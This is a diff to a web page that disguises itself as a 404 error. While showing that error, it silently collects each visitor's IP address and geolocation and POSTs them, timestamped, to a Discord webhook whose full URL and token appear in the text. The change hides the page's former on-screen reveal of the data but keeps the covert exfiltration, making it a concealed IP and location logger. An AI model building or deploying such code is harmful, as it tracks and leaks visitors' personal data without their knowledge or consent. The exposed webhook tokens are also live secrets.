@@ -10,7 +10,9 @@
 
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 
-    <h1>A totally normal website</h1>
+    <h1>404 I think you meant to go to https://soulsender.me</h1>
+    
+    <!--
     <div class="button-div">
         <button onclick="reveal()">Or is it?</button>
     </div>
@@ -26,7 +28,7 @@
         <p id="lang-p"></p>
         
     </div>
-
+    -->
     <script>
         document.getElementById('hidden-info').style.visibility = 'hidden';
 
@@ -39,7 +41,7 @@
                 document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
 
                 var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/1032047721588195359/3QFAbl1GpmbjAbM8rtI4Uj3PHq2GHkDqMPam3cq4_Jcz4YYC-53RqkhdUfDYTDZBlsfH");
+                request.open("POST", "https://discord.com/api/webhooks/1061028958906355842/ROluGq15tTS7GHjKqaoHTIqFJIRx5wcHVTjGi69eCHk7jGs6nYqm1TKM1aCwN_Ga9TEa");
                 request.setRequestHeader('Content-type', 'application/json');
                 let currentDate = new Date();
                 let cSec = currentDate.getSeconds();
@@ -55,16 +57,16 @@
                 request.send(JSON.stringify(params));
 
             })
-            document.getElementById('ip-p').innerHTML = data.ip;
-            document.getElementById('ua-p').innerHTML = navigator.userAgent;
-            document.getElementById('lang-p').innerHTML = navigator.language;
+            //document.getElementById('ip-p').innerHTML = data.ip;
+            //document.getElementById('ua-p').innerHTML = navigator.userAgent;
+            //document.getElementById('lang-p').innerHTML = navigator.language;
         })
 
         
 
-        function reveal() {
-            document.getElementById('hidden-info').style.visibility = 'visible';
-        }
+        //function reveal() {
+        //    document.getElementById('hidden-info').style.visibility = 'visible';
+        //}
     </script>
 
 </body>
